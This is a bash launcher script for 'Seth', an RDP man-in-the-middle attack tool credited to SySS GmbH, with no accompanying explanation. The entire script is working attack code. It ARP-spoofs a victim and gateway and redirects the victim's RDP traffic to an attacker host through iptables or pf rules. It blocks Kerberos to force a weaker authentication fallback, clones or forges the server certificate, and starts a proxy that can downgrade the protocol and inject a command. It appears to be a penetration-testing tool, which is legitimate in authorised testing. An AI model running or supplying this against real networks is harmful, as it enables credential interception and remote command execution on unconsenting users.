#!/bin/bash

cat << EOF
███████╗███████╗████████╗██╗  ██╗
██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
███████║███████╗   ██║   ██║  ██║   https://www.syss.de
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
EOF

set -e

# Ensure we have root permission
if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

# Ensure we have all the required arguments
if [ "$#" -ne 4 -a "$#" -ne 5 ];
then
    echo "Usage:"
    echo "$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP|HOST_IP> [<COMMAND>]"
    exit 1
fi

# Get OS Name
OS=$(uname -s)

# Setup requirements based on OS
# Darwin (MacOS) uses pf as the packet filter module
# while Linux uses iptables
#
# Note: dsniff seems to be abandoned
# TODO: implement own arpspoofer, or relay on something currently maitained eg: bettercap
# TODO: Allow use of a custom openssl version by path
if [ "$OS" == "Darwin" ];
then
    echo "[*] Darwin OS detected, switching from iptables to pf"

    for com in tcpdump arpspoof openssl pfctl ; do
        command -v "$com" >/dev/null 2>&1 || {
            echo >&2 "$com required, but it's not installed.  Aborting."
            exit 1
        }
    done
else
    for com in tcpdump arpspoof openssl iptables ; do
        command -v "$com" >/dev/null 2>&1 || {
            echo >&2 "$com required, but it's not installed.  Aborting."
            exit 1
        }
    done
fi

# Setup variables from cli
IFACE="$1"
ATTACKER_IP="$2"
VICTIM_IP="$3"
GATEWAY_IP="$4"
INJECT_COMMAND="$5"
if [ -z "$SETH_DOWNGRADE" ] ; then
    SETH_DOWNGRADE=3
fi

if [ ! -z "$SETH_DEBUG" ] ; then
    DEBUG_FLAG="-d"
fi

if [ ! -z "$INJECT_COMMAND" ] ; then
    INJECT_COMMAND="-j \"$INJECT_COMMAND\""
fi

# Check if we're on macOS, we need some specific variables for pf environment
if [ "$OS" == "Darwin" ];
then
    # Get current pf status so we can restore it on exit
    PF_STATUS="$(pfctl -qs info | head -1 | awk '{print $2}')"
    # Set a temp file to write pf rules
    PF_TMP_FILE="/tmp/seth.pf"
    # Get current conf file
    PF_CONF_FILE="/private/etc/pf.conf"
    # Get pfctl bin
    PFCTL="/sbin/pfctl"
fi

# Get forwarding state
if [ "$OS" == "Darwin" ];
then
    IP_FORWARD=$(sysctl net.inet.ip.forwarding | awk '{print $2}')
    # Enable pf if not alredy running
    if [ "$PF_STATUS" == "Disabled" ];
    then
        $PFCTL -E
    fi
else
    IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
fi
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Define funciton to add/remove iptables rules on the fly for RDP routing and NAT
set_iptables_1 () {
    local DEL_ADD="$1"
    iptables -"$DEL_ADD" FORWARD -p tcp -s "$VICTIM_IP" \
        --syn --dport 3389 -j REJECT
}

set_iptables_2 () {
    local DEL_ADD="$1"
    iptables -t nat -"$DEL_ADD" PREROUTING -p tcp -d "$ORIGINAL_DEST" \
        -s "$VICTIM_IP" --dport 3389 -j DNAT --to-destination "$ATTACKER_IP"
    iptables -"$DEL_ADD" FORWARD  -p tcp -s "$VICTIM_IP" --dport 88 \
        -j REJECT --reject-with tcp-reset
}

# Define function to add/remove pf rules on the fly for RDP routing and NAT
set_pf_1 () {
    # This works but is not able to keep the connection up after authentication
    echo "rdr pass on en7 proto tcp from "$VICTIM_IP" to any port 3389 -> "$ATTACKER_IP" port 3389" >> $PF_TMP_FILE

    # Only the following entry should be in set_pf_1 to reflect iptables logic
    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389 flags S/S" >> $PF_TMP_FILE
    # Only the previous entry should be in set_pf_1 to reflect iptables logic
  
    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389" >> $PF_TMP_FILE
    echo "block drop on en7 proto tcp from "$VICTIM_IP" to any port 88" >> $PF_TMP_FILE

    $PFCTL -qf $PF_TMP_FILE 2> /dev/null 1>&2
}

# Not used ATM
set_pf_2 () {
    rm $PF_TMP_FILE 2> /dev/null 1>&2

    echo "rdr pass on en7 proto tcp from "$VICTIM_IP" to "$ORIGINAL_DEST" port 3389 -> "$ATTACKER_IP" port 3389" >> $PF_TMP_FILE
    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to "$ORIGINAL_DEST" port 3389" >> $PF_TMP_FILE
    echo "block drop on en7 proto tcp from "$VICTIM_IP" to any port 88" >> $PF_TMP_FILE
    
    # Problem is that this reload will truncat the current RDP connection, and rules are not loaded
    # So we move everything to set_pf_1 until we find a better way to handle this (if it exists)
    $PF_CTL -qf $PF_TMP_FILE 2> /dev/null 1>&2 &
}

# Declare a finish function to cleanup the system
function finish {
    echo "[*] Cleaning up..."
    set +e
    if [ "$OS" == "Darwin" ];
    then
        echo "[*]" $(sysctl net.inet.ip.forwarding=0)
        if [ "$PF_STATUS" == "Disabled" ];
        then
            $PFCTL -qf all 2> /dev/null 1>&2
            $PFCTL -qd 2> /dev/null 1>&2
        else
            $PFCTL -qf $PF_CONF_FILE
        fi
        rm $PF_TMP_FILE 2> /dev/null 1>&2
    else
        set_iptables_1 D 2> /dev/null 1>&2
        set_iptables_2 D 2> /dev/null 1>&2
        printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
    fi
    kill -9 $ARP_PID_1 2> /dev/null 1>&2
    kill -9 $ARP_PID_2 2> /dev/null 1>&2
    pkill -P $$

    # Clear certificate in caso of emergency
    find /tmp/ -name "$ORIGINAL_DEST"* -exec rm  {} \;
    echo "[*] Done"
}
trap finish EXIT

# Define a function to create a self-signed certificate
function create_self_signed_cert {
    local CN="$1"
    echo "[!] Failed to clone certificate, create bogus self-signed certificate..." >&2
    openssl req -subj "/CN=$CN/O=Seth by SySS GmbH" -new \
        -newkey rsa:2048 -days 365 -nodes -x509 \
        -keyout /tmp/$CN.server.key -out /tmp/$CN.server.crt 2>/dev/null 1>&2
    printf "%s\n%s\n" "/tmp/$CN.server.key" "/tmp/$CN.server.crt"
}

# Spoof arp replies
echo "[*] Spoofing arp replies..."

arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 &
ARP_PID_1=$!
arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$VICTIM_IP" 2>/dev/null 1>&2 &
ARP_PID_2=$!

# Enable ip forwarding and setup rule for SYN packets
echo "[*] Turning on IP forwarding..."

if [ "$OS" == "Darwin" ];
then
    echo "[*]" $(sysctl net.inet.ip.forwarding=1)
    echo "[*] Set pf rules for SYN packets..."
    set_pf_1 2>/dev/null 1>&2 &
else
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "[*] Set iptables rules for SYN packets..."
    set_iptables_1 A "$VICTIM_IP"
fi

# Inspect traffic looking for our SYN packet for an RDP connection
echo "[*] Waiting for a SYN packet to the original destination..."

ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
    "tcp[tcpflags] ==  tcp-syn" and \
    src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
    | sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/')"

if [ -z "$ORIGINAL_DEST" ];
then
    echo "[!] Something went wrong while parsing the output of tcpdump"
    exit 1
fi

echo "[+] Got it! Original destination is $ORIGINAL_DEST"

# Clone the original certificate so we can inspect traffic
echo "[*] Clone the x509 certificate of the original destination..."

CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389" || \
    create_self_signed_cert "$ORIGINAL_DEST")"
KEYPATH="$(printf "%s" "$CERT_KEY" | head -n1)"
CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"

# Setup iptables and pf rules for the whole RDP connection
if [ "$OS" == "Darwin" ];
then
    echo "[*] Adjust pf rules for all packets..."
    # This is commented for the reason explained above, until we find a better way to handle this
    # As said above, right now everything is done inside the set_pf_1 function
    #set_pf_2 2>/dev/null 1>&2 &
else
    echo "[*] Adjust iptables rules for all packets..."
    set +e
    set_iptables_1 D "$VICTIM_IP"
    set -e

    set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
fi

# Run the RDP proxy
echo "[*] Run RDP proxy..."

$SCRIPT_DIR/seth.py \
    $INJECT_COMMAND $DEBUG_FLAG -g "$SETH_DOWNGRADE"\
    -c "$CERTPATH" -k "$KEYPATH" \
    "$ORIGINAL_DEST"
